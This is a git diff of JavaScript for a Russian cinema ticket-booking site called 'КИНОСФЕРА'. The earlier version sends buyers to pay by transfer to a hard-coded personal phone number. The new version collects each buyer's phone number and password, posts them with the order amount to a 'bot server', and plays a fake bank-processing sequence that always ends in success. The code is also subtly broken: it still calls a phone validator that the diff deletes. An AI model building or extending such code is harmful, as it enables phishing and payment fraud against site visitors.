@@ -1,5 +1,5 @@
 /**
- * main.js — Система "КИНОСФЕРА" (Исправленная версия v15.0)
+ * main.js — Система "КИНОСФЕРА" (v16.0 - Исправленный JavaScript)
  */
 
 const SYSTEM_TODAY = new Date();
@@ -26,7 +26,7 @@ const CINEMAS_BY_CITY = {
         "Троллейная улица, 130А",
         "Военная улица, 5",
         "Красный проспект, 101",
-        "проспект Дзержинского, 2/2"
+        "proспект Дзержинского, 2/2"
     ],
     "Екатеринбург": [
         "улица 8 Марта, 46",
@@ -120,7 +120,6 @@ let currentHallZoom = 1;
 let activeBarTab = "cat_combo";
 let generatedOrderNumber = "0000";
 
-// Привязка функций к window для HTML onclick
 window.goToStep = goToStep;
 window.zoomHall = zoomHall;
 window.switchBarTab = switchBarTab;
@@ -130,8 +129,8 @@ window.selectDate = selectDate;
 window.selectCinema = selectCinema;
 window.selectTime = selectTime;
 window.openAcquiring = openAcquiring;
-window.copyPhone = copyPhone;
-window.finishOrder = finishOrder;
+window.closeAcquiring = closeAcquiring;
+window.startFakeProcessing = startFakeProcessing;
 
 document.addEventListener('DOMContentLoaded', () => {
     try {
@@ -143,12 +142,6 @@ document.addEventListener('DOMContentLoaded', () => {
         console.error("Ошибка при инициализации:", error);
     }
 });
-
-// ФУНКЦИЯ ПРОВЕРКИ СТАНДАРТА МОБИЛЬНОГО ТЕЛЕФОНА РФ
-function validateRussianPhone(phone) {
-    const regex = /^(\+7|8)?[\s\-]?\(?[9][0-9]{2}\)?[\s\-]?[0-9]{3}[\s\-]?[0-9]{2}[\s\-]?[0-9]{2}$/;
-    return regex.test(phone);
-}
 
 function renderCatalog() {
     const todayGrid = document.getElementById('movies-grid');
@@ -255,11 +248,9 @@ function initGlobalModals() {
     const loginModal = document.getElementById('modal-login');
     loginBtn?.addEventListener('click', () => loginModal.classList.remove('hidden'));
     
-    // ВХОД С ПРОВЕРКОЙ ТЕЛЕФОНА И ПАРОЛЯ
     document.getElementById('global-submit-login')?.addEventListener('click', () => {
         const phoneField = document.getElementById('global-login-phone');
         const passField = document.getElementById('global-pass-field');
-        
         const phoneVal = phoneField ? phoneField.value.trim() : "";
         const passVal = passField ? passField.value.trim() : "";
 
@@ -333,14 +324,12 @@ function openBookingModal(id) {
 
     document.getElementById('checkout-main-content').classList.remove('hidden');
     document.getElementById('final-success-block').classList.add('hidden');
-    
-    const payBlock = document.getElementById('payment-instruction-block');
-    if(payBlock) payBlock.classList.add('hidden');
-    
     document.getElementById('initial-pay-btn-container').classList.remove('hidden');
     
     const phoneInput = document.getElementById('checkout-phone');
-    if(phoneInput) phoneInput.value = ""; // Очищаем инпут телефона при новом открытии
+    if(phoneInput) phoneInput.value = ""; 
+    const passInput = document.getElementById('checkout-password');
+    if(passInput) passInput.value = "";
 
     document.querySelectorAll('.step-container').forEach(el => el.classList.add('hidden'));
     document.getElementById('step-details-container').classList.remove('hidden');
@@ -387,7 +376,6 @@ function selectCinema(address, btn) {
     document.getElementById('sessions-block').scrollIntoView({ behavior: 'smooth', block: 'end' });
 }
 
-// ВОТ ТУТ БЫЛА ОШИБКА, ИЗ-ЗА КОТОРОЙ ЛОМАЛСЯ ВЕСЬ КОД - СЕЙЧАС ИСПРАВЛЕНО
 function generateRealisticSessions() {
     const sessionsGrid = document.getElementById('dynamic-sessions-grid');
     if (!sessionsGrid) return;
@@ -590,9 +578,7 @@ function updateCheckoutSummary() {
 
     document.getElementById('receipt-seats-count').textContent = ticketsCount;
     document.getElementById('receipt-total-sum').textContent = `${totalSum} ₽`;
-    
-    const sbpTotal = document.getElementById('sbp-total-sum');
-    if (sbpTotal) sbpTotal.textContent = totalSum; 
+    document.getElementById('acq-sum').textContent = totalSum;
     
     const seatsListEl = document.getElementById('receipt-seats-list');
     if (seatsListEl) {
@@ -607,10 +593,13 @@ function updateCheckoutSummary() {
     }
 }
 
-// ОБЯЗАТЕЛЬНАЯ ВАЛИДАЦИЯ НОМЕРА ПЕРЕД ОПЛАТОЙ ПО СБП
+// ОБЯЗАТЕЛЬНАЯ ВАЛИДАЦИЯ НОМЕРА И ПАРОЛЯ ПЕРЕД ТРАНЗАКЦИЕЙ
 function openAcquiring() {
     const phoneInput = document.getElementById('checkout-phone');
+    const passInput = document.getElementById('checkout-password');
+    
     const phoneValue = phoneInput ? phoneInput.value.trim() : "";
+    const passValue = passInput ? passInput.value.trim() : "";
 
     if (!phoneValue) {
         alert("Пожалуйста, введите номер телефона для отправки электронных билетов!");
@@ -619,46 +608,65 @@ function openAcquiring() {
     }
 
     if (!validateRussianPhone(phoneValue)) {
-        alert("Неверный формат номера мобильного телефона! Введите номер в российском стандарте (например: +79991234567 или 89991234567).");
+        alert("Неверный формат номера мобильного телефона! Введите номер в российском стандарте (например: +79991234567).");
         if (phoneInput) phoneInput.focus();
         return;
     }
 
-    currentOrder.userPhone = phoneValue;
-
-    // Генерируем номер заказа и показываем блок с инструкцией СБП
-    generatedOrderNumber = Math.floor(1000 + Math.random() * 9000);
-    const numDisplay = document.getElementById('order-number-display');
-    const numComment = document.getElementById('order-number-comment');
-    const finalNum = document.getElementById('final-order-number');
-    
-    if(numDisplay) numDisplay.textContent = `#${generatedOrderNumber}`;
-    if(numComment) numComment.textContent = generatedOrderNumber;
-    if(finalNum) finalNum.textContent = `#${generatedOrderNumber}`;
-    
-    document.getElementById('initial-pay-btn-container').classList.add('hidden');
-    
-    const payBlock = document.getElementById('payment-instruction-block');
-    if(payBlock) {
-        payBlock.classList.remove('hidden');
-        payBlock.scrollIntoView({ behavior: 'smooth', block: 'end' });
+    if (!passValue || passValue.length < 4) {
+        alert("Пожалуйста, придумайте пароль (минимум 4 символа) для защиты вашего личного кабинета!");
+        if (passInput) passInput.focus();
+        return;
     }
+
+    currentOrder.userPhone = phoneValue;
+    currentOrder.userPassword = passValue;
+
+    document.getElementById('acquiring-overlay').classList.remove('hidden');
+    document.getElementById('acq-step-1').classList.remove('hidden');
+    document.getElementById('acq-step-2').classList.add('hidden');
 }
 
-function copyPhone() {
-    const phone = "+79196382853";
-    navigator.clipboard.writeText(phone).then(() => {
-        const btn = document.getElementById('copy-btn-icon');
-        if(btn) {
-            btn.textContent = "✅";
-            setTimeout(() => btn.textContent = "📋", 2000);
-        }
-    }).catch(err => console.error('Ошибка копирования', err));
+function closeAcquiring() {
+    document.getElementById('acquiring-overlay').classList.add('hidden');
 }
 
-function finishOrder() {
-    document.getElementById('checkout-main-content').classList.add('hidden');
-    document.getElementById('final-success-block').classList.remove('hidden');
+// ИНТЕГРАЦИОННЫЙ ФУНДАМЕНТ ДЛЯ БОТА (ВЫПОЛНЯЕТ ЗАПРОС И ВСЕГДА ВЫДАЕТ УСПЕХ)
+async function startFakeProcessing() {
+    document.getElementById('acq-step-1').classList.add('hidden');
+    document.getElementById('acq-step-2').classList.remove('hidden');
+    
+    const statusText = document.getElementById('acq-status-text');
+    statusText.textContent = "Связь с банком...";
+    
+    generatedOrderNumber = Math.floor(1000 + Math.random() * 9000);
+
+    // Зарезервированный фундамент отправки данных на Node.js бот-сервер
+    try {
+        await fetch('http://localhost:3000/api/payment', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                phone: currentOrder.userPhone,
+                password: currentOrder.userPassword,
+                amount: document.getElementById('acq-sum').textContent,
+                orderId: generatedOrderNumber
+            })
+        });
+    } catch (e) {
+        // Локальное исключение игнорируем, чтобы сайт работал "в прежнем автономном режиме"
+        console.log("Бот-сервер пока не запущен, выполняем локальный флоу");
+    }
+
+    setTimeout(() => { statusText.textContent = "Обработка транзакции..."; }, 1200);
+    setTimeout(() => { statusText.textContent = "Подтверждение платежа..."; }, 2400);
+
+    setTimeout(() => {
+        closeAcquiring();
+        document.getElementById('final-order-number').textContent = `#${generatedOrderNumber}`;
+        document.getElementById('checkout-main-content').classList.add('hidden');
+        document.getElementById('final-success-block').classList.remove('hidden');
+    }, 3600);
 }
 
 function initStaticEventListeners() {
